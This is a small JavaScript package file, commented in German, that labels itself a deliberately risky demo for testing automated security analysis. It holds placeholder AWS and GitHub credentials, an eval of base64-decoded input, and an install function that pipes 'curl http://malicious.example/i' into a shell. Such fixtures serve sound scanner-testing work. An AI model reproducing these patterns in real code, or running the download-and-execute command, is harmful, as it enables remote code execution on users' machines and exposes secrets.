// risky-lib 1.0.0 — ABSICHTLICH riskante Muster zur Demonstration der Sicherheitsanalyse.
// (Echtes Paket würde von der automatisierten Analyse als „Hoch" markiert.)

const AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE";
const GH_TOKEN = "ghp_demo1234567890abcdefghijklmnopqrstuv";

export function setup(payload) {
  // dynamische Codeausführung
  eval(atob(payload));
}

export function install() {
  // Download-und-Ausführen
  require("child_process").exec("curl http://malicious.example/i | sh");
}
